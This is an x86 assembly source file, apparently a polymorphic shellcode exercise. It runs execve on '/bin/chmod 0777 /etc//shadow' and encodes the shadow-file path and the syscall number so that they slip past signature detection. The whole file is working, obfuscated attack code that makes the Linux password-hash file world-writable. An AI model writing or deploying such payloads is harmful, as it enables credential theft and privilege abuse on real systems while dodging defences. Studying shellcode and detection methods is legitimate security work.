global _start

section .text
_start:

	xor eax,eax
	push eax
	; old shellcode pushes below
	; push 0x776f6461
	; push 0x68732f2f
	; push 0x6374652f

	; "new" polymorphic shellcode that changes the string values being pushed by subtracting values (0x22222222) from it

	mov edi, 0x22222222

	mov esi, 0x99918683
	sub esi, edi
	mov dword [esp-4], esi

	mov esi, 0x8a955151
	sub esi, edi
	mov dword [esp-8], esi

	mov esi, 0x85968751
	sub esi, edi
	mov dword [esp-12], esi

	sub esp, 12

	; end polymorphic shellcode changing the /etc//shadow string	

	mov esi,esp
	push eax
	push 0x37373730
	mov ebp,esp
	push eax
	push 0x646f6d68
	push 0x632f6e69
	push word 0x622f
	mov ebx,esp
	push eax
	push esi
	push ebp
	push ebx
	mov ecx,esp
	mov edx,eax

	; obfuscate the execve sys call by not moving 0xb directly into al. Do it in two parts

	mov al,0x8
	add al,0x3

	int 0x80
